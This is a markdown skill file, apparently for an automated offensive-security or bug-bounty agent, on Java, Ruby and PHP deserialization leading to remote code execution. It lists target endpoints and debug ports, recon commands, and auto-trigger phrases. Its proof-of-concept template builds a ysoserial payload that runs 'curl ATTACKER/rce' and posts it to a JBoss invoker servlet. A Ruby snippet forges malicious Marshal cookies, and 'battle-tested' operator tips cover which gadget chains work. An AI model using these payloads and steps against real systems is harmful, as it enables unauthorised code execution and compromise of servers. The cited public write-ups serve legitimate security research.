---
name: java-deserialization-rce
pattern: Java/Ruby Deserialization → RCE
description: "Auto-trigger: JBoss/WebSphere/WebLogic detected, ysoserial, JDWP debug port, Ruby Marshal.load, PHP unserialize"
tech: [java, jboss, websphere, ruby-on-rails, php]
severity: Critical
triggers:
  - /test-deser
  - java deserialization
  - jboss rce
  - ysoserial
  - ruby marshal
  - php unserialize
related_patterns:
  - java-hessian-deserialization
  - dotnet-deserialization-advanced
  - deserialization-gadgets
  - parser-differential-attacks
sources:
  - "Michael Stepankin — PayPal RCE"
  - "Wesley Wineberg — Instagram RCE"
  - "Michiel Prins — Algolia/Facebook"
  - "Ruslan Habalov — Pornhub PHP"
---

# Java/Ruby Deserialization → RCE

## Crown Jewel Targets

- JBoss/WildFly with exposed `/invoker/JMXInvokerServlet`
- WebSphere/WebLogic admin consoles and T3 protocol
- JDWP debug ports (5005, 8000, 9999) exposed
- Ruby on Rails apps with unsigned cookie sessions
- PHP apps with `unserialize()` on user-controlled input
- Java apps with `readObject()` on untrusted data

## Attack Surface Signals

- JBoss indicators: `/jboss-net/`, `/invoker/`, `/jmx-console/`, `/web-console/`
- WebSphere: `/ibm/console/`, T3 protocol on port 7001
- JDWP: ports 5005, 5050, 8000, 9999 open
- Ruby: `Set-Cookie` without `HttpOnly`/`Secure` flags
- PHP: serialized data in cookies/parameters (`O:4:`, `a:2:`)

## Detection
```bash
# Java deserialization magic bytes in requests (ac ed 00 05)
# Check for ysoserial-compatible endpoints
curl -s TARGET -D- | grep -i "remoting\|invoker\|jboss\|websphere\|jmx-console\|web-console"
# JDWP debug port
naabu -host TARGET -p 5005,5050,8000,9999 -silent
# Ruby cookie deserialization
curl -s TARGET -D- | grep -i "Set-Cookie" | grep -v "httponly\|secure"
```

**Positive indicators:**
- JBoss/WebSphere/WebLogic/JMX console accessible
- JDWP debug port open (5005, 8000, 9999)
- Ruby `Marshal.load` on user-controlled cookie value
- PHP `unserialize()` on user input

## Exploitation
1. **Java (JBoss/WebSphere)**: Use ysoserial to generate payload → send to deserialization endpoint
2. **Ruby cookie**: Forge cookie with serialized payload → `Marshal.load` executes it
3. **PHP**: Craft serialized PHP object with `__wakeup()` chain → send in cookie/POST param

## PoC Template
```bash
# Java (ysoserial)
# Generate payload
java -jar ysoserial.jar CommonsCollections1 "curl ATTACKER/rce" > payload.bin
# Send to JBoss invoker
curl -s -X POST TARGET/invoker/JMXInvokerServlet \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

```ruby
# Ruby cookie deserialization
# Generate malicious cookie using ruby-marshal
require 'base64'
payload = Marshal.dump(MALICIOUS_OBJECT)  # ysoserial-style chain
puts Base64.strict_encode64(payload)
# Set as session cookie
```

## Important Notes
- ysoserial gadget chains: CommonsCollections1-7 for Java, Spring for Spring apps
- JDWP open = game over (arbitrary code execution via debug protocol directly)
- Always test: `OPTIONS /invoker/JMXInvokerServlet` → 200 = likely vulnerable
- PHP POP chains depend on autoloaded classes — framework-specific (Laravel, Symfony, WordPress)

## Reference Writeups
- [Java Deserialization in manager.paypal.com](http://artsploit.blogspot.hk/2016/01/paypal-rce.html) by Michael Stepankin
- [Instagram's Million Dollar Bug (deserialization)](http://www.exfiltrated.com/research-Instagram-RCE.php) by Wesley Wineberg
- [Ruby Cookie Deserialization RCE on facebooksearch.algolia.com](https://hackerone.com/reports/134321) by Michiel Prins
- [How we broke PHP, hacked Pornhub and earned $20,000](https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/) by Ruslan Habalov

## Operator Notes (Battle-Tested)

- **JDWP open = game over**: Arbitrary code execution directly via debug protocol. No gadget chain needed. Check ports 5005/8000/9999 first.
- **`OPTIONS /invoker/JMXInvokerServlet` returning 200 = likely vulnerable**: Quick check before attempting ysoserial payloads.
- **CommonsCollections1-7 gadgets for Java**: Try all variants. Different classpath = different working gadgets. CommonsCollections5/6 are most reliable.
- **PHP POP chains are framework-specific**: Laravel, Symfony, WordPress each have different autoloaded classes and gadget chains.
- **Ruby `Marshal.load` on cookies**: If session cookie is not signed/encrypted, forge cookie with serialized payload.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `java-hessian-deserialization` | Hessian-specific deser chains |
| `dotnet-deserialization-advanced` | .NET deser patterns |
| `deserialization-gadgets` | Gadget chain reference |
| `parser-differential-attacks` | Bypass sanitizers before deser |
